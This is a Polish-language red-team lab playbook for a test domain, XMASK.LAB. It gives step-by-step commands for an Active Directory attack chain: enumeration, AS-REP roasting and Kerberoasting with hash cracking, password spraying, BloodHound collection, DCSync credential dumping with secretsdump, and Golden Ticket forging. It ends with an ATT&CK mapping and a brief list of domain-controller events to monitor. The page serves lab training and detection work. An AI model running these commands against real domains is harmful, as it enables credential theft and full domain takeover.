---
title: "Playbook ataków AD"
date: 2026-08-16
tags: [lab, redteam, active-directory, playbook, attck]
category: lab
---

# Playbook ataków AD — XMASK.LAB

Pełny łańcuch: enum → AS-REP → spray → Kerberoast → BloodHound → DCSync.
Wszystkie hasła w zmiennych — bierz je z `/root/redteam-lab-secrets/env` (poza vaultem).

Powiązane: [[Wiedza/Ataki/Active_Directory_Ataki]] · [[Topologia]] · [[README]]

> Status zweryfikowanych technik i niuanse Samby 4.19: [[Status_Lab]]

## Przygotowanie w Kali

```bash
docker exec -it kali bash
export DC=10.10.0.2
export DOMAIN=xmask.lab
export REAM=XMASK.LAB
# (hasła znajdziesz w /root/redteam-lab-secrets/env na hoście)
```

---

## 1. Rekon / enumeracja  — ATT&CK T1018, T1087

```bash
nmap -Pn -p 53,88,135,139,389,445,464,636,3268,3269 $DC
enum4linux-ng -A $DC
ldapsearch -x -H ldap://$DC -b "DC=xmask,DC=lab" "(objectClass=user)" sAMAccountName
```

## 2. AS-REP Roasting (bez haseł) — T1558.004

```bash
printf 'alice\nbob\ncarol\nsvc_sql\nsvc_backup\nasrep_user\nadministrator\n' > /tmp/users.txt
impacket-GetNPUsers -dc-ip $DC -usersfile /tmp/users.txt "$DOMAIN/" -no-pass -format john -outputfile /tmp/asrep.txt
john --format=krb5asrep --wordlist=/opt/wordlists/lab-passwords.txt /tmp/asrep.txt
```

## 3. Password spray — T1110.003

```bash
kerbrute passwordspray -d $DOMAIN --dc $DC /tmp/users.txt '$SPRAY_PASSWORD'
```

## 4. Kerberoasting (jako alice) — T1558.003

```bash
impacket-GetUserSPNs -dc-ip $DC "$DOMAIN/alice:$ALICE_PASSWORD" -request -outputfile /tmp/spn.txt
john --format=krb5tgs --wordlist=/opt/wordlists/lab-passwords.txt /tmp/spn.txt
```

## 5. BloodHound (zbieranie danych) — T1087.002

```bash
bloodhound-python -u alice -p "$ALICE_PASSWORD" -d $DOMAIN -ns $DC -c All --zip
# pliki JSON gotowe do wgrania do BloodHound CE / neo4j
```

## 6. DCSync (jako Administrator / DA) — T1003.006

```bash
impacket-secretsdump -just-dc "$DOMAIN/administrator:$ADMIN_PASSWORD@$DC"
# daje krbtgt + NTLM hashe wszystkich kont -> Golden Ticket niżej
```

## 7. Golden Ticket (opcjonalnie, po zdobyciu krbtgt) — T1558.001

```bash
impacket-ticketer -nthash <KRBTGT_NTHASH> -domain-sid <DOMAIN_SID> -domain $DOMAIN administrator
export KRB5CCNAME=/root/administrator.ccache
impacket-secretsdump -k -no-pass $DC
```

---

## Mapowanie na ATT&CK

| Krok | Technika | ID |
|------|----------|-----|
| Enumeracja | Remote System Discovery / Account Discovery | T1018 / T1087 |
| AS-REP | Steal or Forge Kerberos Tickets: AS-REP Roasting | T1558.004 |
| Spray | Brute Force: Password Spraying | T1110.003 |
| Kerberoast | Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 |
| BloodHound | Account Discovery: Domain Account | T1087.002 |
| DCSync | OS Credential Dumping: DCSync | T1003.006 |
| Golden Ticket | Steal or Forge Kerberos Tickets: Golden Ticket | T1558.001 |

## Detekcja (purple) — co monitorować na DC

- 4768/4769 (Kerberos), 4662 (replikacja), 4624 (loginy), 4720/4732 (konta/grupy).
- Masowe zapytania SAM-R / LDAP (BloodHound).
- Reguły: Sigma / Suricata — patrz `Wiedza/Obrona/Obrona_MOC`.